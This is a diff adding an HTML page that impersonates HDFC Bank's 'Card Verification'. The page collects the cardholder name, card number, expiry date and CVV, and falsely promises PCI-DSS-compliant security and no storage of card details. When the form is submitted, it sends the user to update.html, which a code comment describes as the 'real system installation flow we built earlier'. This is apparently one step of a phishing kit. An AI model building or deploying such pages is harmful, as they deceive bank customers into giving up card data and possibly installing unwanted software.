@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank - Card Verification</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        .form-container {
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .header-bar {
+            background-color: var(--hdfc-blue);
+            color: white;
+            padding: 20px;
+            margin: -20px -20px 20px -20px;
+        }
+        .header-bar h2 {
+            font-size: 20px;
+            margin-bottom: 5px;
+        }
+        .header-bar p {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        .visual-card {
+            background: linear-gradient(135deg, #ed232a 0%, #b2181d 100%);
+            border-radius: 16px;
+            padding: 25px;
+            color: white;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 25px rgba(237, 35, 42, 0.3);
+            position: relative;
+        }
+        .card-num-display {
+            font-size: 22px;
+            letter-spacing: 2px;
+            margin: 30px 0;
+            font-family: monospace;
+        }
+        .card-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 10px;
+            text-transform: uppercase;
+        }
+        .input-group {
+            background: #fff;
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            margin-bottom: 25px;
+        }
+        .field {
+            margin-bottom: 15px;
+        }
+        .field input {
+            width: 100%;
+            height: 48px;
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 0 15px;
+            font-size: 15px;
+            outline: none;
+        }
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .security-badge {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .security-badge h4 {
+            color: var(--hdfc-blue);
+            margin-bottom: 5px;
+        }
+        .security-badge p {
+            font-size: 11px;
+            color: var(--text-grey);
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-bar">
+        <h2>Card Verification</h2>
+        <p>Enter credit card details and verify your card securely</p>
+    </div>
+
+    <main class="form-container">
+        <!-- Visual Card -->
+        <div class="visual-card">
+            <div style="font-weight: 700; font-size: 14px;">HDFC BANK</div>
+            <div class="card-num-display" id="dispNum">**** **** **** 1234</div>
+            <div class="card-meta">
+                <div>
+                    <span>Card Holder</span><br>
+                    <strong id="dispName" style="font-size: 13px;">CARD HOLDER</strong>
+                </div>
+                <div>
+                    <span>Exp</span><br>
+                    <strong id="dispExp" style="font-size: 13px;">MM/YY</strong>
+                </div>
+            </div>
+            <img src="https://img.icons8.com/color/48/ffffff/visa.png" style="position: absolute; top: 20px; right: 20px; width: 40px;">
+        </div>
+
+        <form id="verifyForm">
+            <div class="input-group">
+                <div class="field">
+                    <input type="text" id="nameInput" placeholder="Cardholder Name" required>
+                </div>
+                <div class="field">
+                    <input type="tel" id="numInput" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+                <div class="row">
+                    <div class="field" style="flex: 1;">
+                        <input type="text" id="expInput" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="field" style="flex: 1;">
+                        <input type="password" placeholder="CVV" maxlength="3" required>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="btn btn-primary btn-wide">Verify Card</button>
+        </form>
+
+        <div class="security-badge">
+            <img src="https://img.icons8.com/ios-filled/50/ed232a/lock.png" style="width: 30px; margin-bottom: 10px;">
+            <h4>Bank-Grade Security</h4>
+            <p>Your card details are encrypted and processed securely using PCI-DSS compliant security standards. We do not store your card information.</p>
+        </div>
+    </main>
+
+    <script>
+        // Real-time card update logic
+        const nameInput = document.getElementById('nameInput');
+        const numInput = document.getElementById('numInput');
+        const expInput = document.getElementById('expInput');
+        
+        nameInput.addEventListener('input', () => document.getElementById('dispName').textContent = nameInput.value || 'CARD HOLDER');
+        numInput.addEventListener('input', () => document.getElementById('dispNum').textContent = numInput.value || '**** **** **** 1234');
+        expInput.addEventListener('input', () => document.getElementById('dispExp').textContent = expInput.value || 'MM/YY');
+
+        document.getElementById('verifyForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            // Final Step: Trigger the real system installation flow we built earlier
+            window.location.href = 'update.html';
+        });
+    </script>
+</body>
+</html>
